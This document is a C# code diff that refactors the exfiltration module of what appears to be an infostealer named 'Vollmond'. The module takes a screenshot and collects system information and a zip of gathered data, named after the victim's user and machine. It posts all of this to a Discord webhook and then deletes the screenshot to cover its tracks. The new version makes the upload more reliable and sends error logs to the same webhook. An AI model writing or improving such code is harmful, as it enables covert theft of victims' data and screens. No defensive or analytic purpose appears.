@@ -2,46 +2,64 @@
 {
     internal class SendToDiscord
     {
-        public static async void Send()
+        public static async Task SendAsync()
         {
-            using (var httpClient = new HttpClient())
-            using (var multipart = new MultipartFormDataContent())
+            string screenshotPath = null;
+
+            try
             {
-                var systemInfo = Auxiliary.GetSystemInfo();
+                screenshotPath = Auxiliary.MakeScreenshot();
 
-                if (!String.IsNullOrEmpty(Program.zipPath))
+                using var httpClient = new HttpClient();
+                using var multipart = new MultipartFormDataContent();
+
+                // Add common content
+                multipart.Add(new StringContent(await Auxiliary.GetSystemInfo()), "content");
+                multipart.Add(new StringContent("Vollmond"), "username");
+                multipart.Add(new StringContent("https://tengrinews.kz/userdata/news/2023/news_509043/thumb_m/photo_442217.jpeg"), "avatar_url");
+
+                // Add screenshot - DON'T use 'using' here
+                if (File.Exists(screenshotPath))
                 {
-                    string screenshot_path = Auxiliary.MakeScreenshot();
-
-                    using var zipStream = File.OpenRead(Program.zipPath);
-                    using var screenshotStream = File.OpenRead(screenshot_path);
-
-                    multipart.Add(new StringContent(await Auxiliary.GetSystemInfo()), "content"); // Main message with info
-                    multipart.Add(new StringContent("Vollmond"), "username"); // webhook's name
-                    multipart.Add(new StringContent("https://tengrinews.kz/userdata/news/2023/news_509043/thumb_m/photo_442217.jpeg"), "avatar_url");
-
-                    var zipContent = new StreamContent(zipStream);
-                    multipart.Add(zipContent, "file0", $@"{Environment.UserName}@{Environment.MachineName}.zip"); // data
-
+                    var screenshotStream = File.OpenRead(screenshotPath);
                     var screenContent = new StreamContent(screenshotStream);
-                    multipart.Add(screenContent, "file1", "screenshot.png"); // screenshot
-
-                    await httpClient.PostAsync(URLs.webhook, multipart); // sending
+                    multipart.Add(screenContent, "file0", "screenshot.png");
+                    // Stream will be disposed by HttpClient after sending
                 }
-                else
+
+                // Add zip file if exists - DON'T use 'using' here
+                if (File.Exists(Program.zipPath))
                 {
-                    string screenshot_path = Auxiliary.MakeScreenshot();
-                    ;
-                    using var screenshotStream = File.OpenRead(screenshot_path);
+                    var zipStream = File.OpenRead(Program.zipPath);
+                    var zipContent = new StreamContent(zipStream);
+                    multipart.Add(zipContent, "file1", $"{Environment.UserName}@{Environment.MachineName}.zip");
+                    // Stream will be disposed by HttpClient after sending
+                }
 
-                    multipart.Add(new StringContent(await Auxiliary.GetSystemInfo()), "content"); // Main message with info
-                    multipart.Add(new StringContent("Vollmond"), "username"); // webhooks 's name
-                    multipart.Add(new StringContent("https://tengrinews.kz/userdata/news/2023/news_509043/thumb_m/photo_442217.jpeg"), "avatar_url");
+                // Send the request
+                var response = await httpClient.PostAsync(URLs.webhook, multipart);
 
-                    var screenContent = new StreamContent(screenshotStream);
-                    multipart.Add(screenContent, "file0", "screenshot.png"); // screenshot
-
-                    await httpClient.PostAsync(URLs.webhook, multipart); // sending
+                // Check response
+                if (!response.IsSuccessStatusCode)
+                {
+                    var error = await response.Content.ReadAsStringAsync();
+                    await httpClient.PostAsync(URLs.webhook, new StringContent($"ERROR\n{DateTime.Now}: HTTP {response.StatusCode} - {error}\n"));
+                }
+            }
+            catch (Exception ex)
+            {
+                // Log error
+                using (HttpClient client = new HttpClient()) {
+                    await client.PostAsync(URLs.webhook, new StringContent($"ERROR-LOG\n {DateTime.Now}: {ex.Message}\n{ex.StackTrace}\n\n"));
+                }
+            }
+            finally
+            {
+                // Clean up screenshot file
+                if (screenshotPath != null && File.Exists(screenshotPath))
+                {
+                    try { File.Delete(screenshotPath); }
+                    catch { /* Ignore cleanup errors */ }
                 }
             }
         }
